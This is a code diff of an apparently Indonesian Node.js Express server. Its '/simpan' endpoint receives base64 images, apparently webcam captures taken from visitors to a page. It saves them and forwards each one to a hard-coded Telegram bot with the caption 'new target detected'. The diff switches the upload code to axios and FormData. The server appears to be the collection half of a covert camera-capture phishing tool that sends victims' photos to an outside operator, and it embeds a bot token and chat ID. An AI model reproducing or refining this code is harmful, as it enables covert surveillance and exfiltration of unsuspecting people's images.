@@ -1,77 +1,59 @@
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
+const axios = require('axios');
+const FormData = require('form-data');
 const app = express();
 
-// Limit diperbesar agar tidak error saat kirim foto kualitas tinggi
 app.use(express.json({ limit: '20mb' }));
 app.use(express.static('public'));
 
-// Data Telegram Kamu
 const BOT_TOKEN = '8604448756:AAHJ-CdHZpeiEM73TpjnMA5S2O5hu5oeU30'; 
 const CHAT_ID = '7381262089';
 
-// Pastikan folder uploads ada (biar tidak error saat simpan file)
 const uploadDir = path.join(__dirname, 'uploads');
-if (!fs.existsSync(uploadDir)){
-    fs.mkdirSync(uploadDir);
-}
+if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);
 
 app.post('/simpan', async (req, res) => {
-    console.log("📩 Ada kiriman masuk...");
     const base64Data = req.body.image;
-
-    if (!base64Data) {
-        console.log("❌ Data gambar kosong!");
-        return res.json({ status: false });
-    }
+    if (!base64Data) return res.json({ status: false });
 
     try {
-        // 1. Proses Data Base64
         const base64Image = base64Data.split(';base64,').pop();
         const buffer = Buffer.from(base64Image, 'base64');
         const namaFile = `capture_${Date.now()}.jpg`;
         const filePath = path.join(uploadDir, namaFile);
 
-        // 2. SIMPAN KE FOLDER UPLOADS
-        fs.writeFile(filePath, buffer, (err) => {
-            if (err) {
-                console.log("❌ Gagal simpan ke folder:", err);
-            } else {
-                console.log(`✅ Tersimpan di folder: ${namaFile}`);
-            }
+        // 1. Simpan Lokal (Berhasil)
+        fs.writeFileSync(filePath, buffer);
+        console.log(`✅ File simpan di: ${namaFile}`);
+
+        // 2. Kirim ke Telegram (Pakai Axios + FormData)
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('photo', buffer, { filename: 'tangkapan.jpg' });
+        form.append('caption', '📸 *TARGET BARU TERDETEKSI!*');
+        form.append('parse_mode', 'Markdown');
+
+        console.log("📤 Sedang mencoba tembak ke Telegram...");
+        
+        const teleRes = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
+            headers: form.getHeaders()
         });
 
-        // 3. KIRIM KE TELEGRAM
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        
-        const blob = new Blob([buffer], { type: 'image/jpeg' });
-        formData.append('photo', blob, namaFile);
-        formData.append('caption', `📸 *TARGET BARU!*\n\nNama File: ${namaFile}\nWaktu: ${new Date().toLocaleString('id-ID')}`);
-        formData.append('parse_mode', 'Markdown');
-
-        console.log("📤 Mengirim ke Telegram...");
-        const teleRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        });
-
-        const hasil = await teleRes.json();
-        
-        if (hasil.ok) {
-            console.log("🚀 Berhasil kirim ke Telegram!");
+        if (teleRes.data.ok) {
+            console.log("🚀 MANTAP! Bot berhasil kirim foto.");
             res.json({ status: true });
         } else {
-            console.log("❌ Gagal kirim ke Tele:", hasil.description);
-            res.json({ status: false, error: hasil.description });
+            console.log("❌ Telegram nolak:", teleRes.data.description);
+            res.json({ status: false });
         }
 
     } catch (err) {
-        console.error("🔥 Error Server:", err.message);
-        res.json({ status: false, error: err.message });
+        console.error("🔥 Error:", err.response ? err.response.data : err.message);
+        res.json({ status: false });
     }
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log('🚀 Server Berjalan di Port ' + PORT));
+app.listen(PORT, () => console.log('Server ON di port ' + PORT));
